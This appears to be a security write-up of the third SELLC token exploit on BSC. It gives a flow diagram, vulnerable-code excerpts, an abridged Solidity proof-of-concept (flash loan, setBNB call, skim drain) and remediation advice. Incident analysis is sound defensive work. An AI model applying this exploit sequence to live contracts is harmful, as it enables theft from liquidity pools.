# SELLC03 — Reflective Skim Attack (3rd Incident) Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-20 |
| **Protocol** | SELLC Token (3rd Incident) |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Contract** | [0x2cc392c0...](https://bscscan.com/address/0x2cc392c0207d080aec0befe5272659d3bb8a7052) |
| **Attack Tx** | [0xe968e648...](https://bscscan.com/tx/0xe968e648b2353cea06fc3da39714fb964b9354a1ee05750a3c5cc118da23444b) |
| **Vulnerable Contract** | [0x84Be9475...](https://bscscan.com/address/0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1) |
| **Root Cause** | Same reflective skim pattern as SELLC 1st and 2nd attacks (patch not applied) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SELLC03_exp.sol) |

---
## 1. Vulnerability Overview

The SELLC token's reflective tax mechanism was exploited a third time in June using the same pattern as the 1st attack on May 17 and the 2nd attack on May 18. The reflective tax is not synchronized with the LP reserve, allowing excess balance to be drained via `skim()`. An additional vulnerability through the `setBNB()` function was also leveraged.

## 2. Vulnerable Code Analysis

```solidity
// ❌ SELLC reflective mechanism (same as 1st and 2nd incidents)
function _reflectFee(uint256 rFee, uint256 tFee) private {
    _rTotal -= rFee;  // ❌ Balance increases without updating LP reserve
    _tFeeTotal += tFee;
}

// ❌ setBNB: additional manipulation function
interface Miner {
    // ❌ BNB-related settings modifiable without access control
    function setBNB(address token, address token1) external payable;
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Same reflective skim pattern as SELLC 1st and 2nd attacks (patch not applied)
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌────────────────────────────────────────────────┐
│  1. Borrow BUSD via DODO flash loan            │
└──────────────────────┬─────────────────────────┘
                       ▼
┌────────────────────────────────────────────────┐
│  2. Buy large amount of SELLC with BUSD        │
│     → Tax deepens LP imbalance                 │
└──────────────────────┬─────────────────────────┘
                       ▼
┌────────────────────────────────────────────────┐
│  3. Call setBNB() for additional manipulation  │
│  4. Drain excess SELLC via skim()              │
└──────────────────────┬─────────────────────────┘
                       ▼
┌────────────────────────────────────────────────┐
│  5. Sell SELLC back to BUSD + repay flash loan │
└────────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // Borrow BUSD via DODO flash loan
    DPPOracle.flashLoan(busdAmount, 0, address(this), bytes("attack"));
}

function DPPFlashLoanCallback(address, uint256 amount, uint256, bytes calldata) external {
    // 1. Buy SELLC with BUSD (tax is incurred)
    swapBUSDtoSELLC(amount);

    // 2. Additional manipulation via setBNB
    minerContract.setBNB{value: 0}(address(sellc), address(busd));

    // 3. Drain excess SELLC via skim
    sellcPair.skim(address(this));

    // 4. Sell SELLC back to BUSD
    swapSELLCtoBUSD(sellc.balanceOf(address(this)));

    // 5. Repay flash loan
    busd.transfer(address(DPPOracle), amount);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Reflective tax LP imbalance | HIGH | CWE-682 | 07_token_integration.md |
| V-02 | Missing access control on setBNB | HIGH | CWE-284 | 03_access_control.md |
| V-03 | Repeated vulnerability left unpatched | CRITICAL | CWE-693 | 11_logic_error.md |

## 6. Remediation Recommendations

### Immediate Actions
Actions that should have been applied after the 1st attack:
```solidity
// ✅ Register LP pair as excluded
// ✅ Call sync() after tax
// ✅ Disable skim() functionality
// ✅ Restrict setBNB to onlyOwner
```

## 7. Lessons Learned

Being exploited three times via the same vulnerability is an extreme example of incident response failure. Upon the first attack, the contract should have been immediately paused, and service kept offline until root cause analysis was complete and a patch deployed. For tokens based on open-source code, the same vulnerability may exist across multiple projects — a comprehensive sweep of all similar projects is therefore necessary.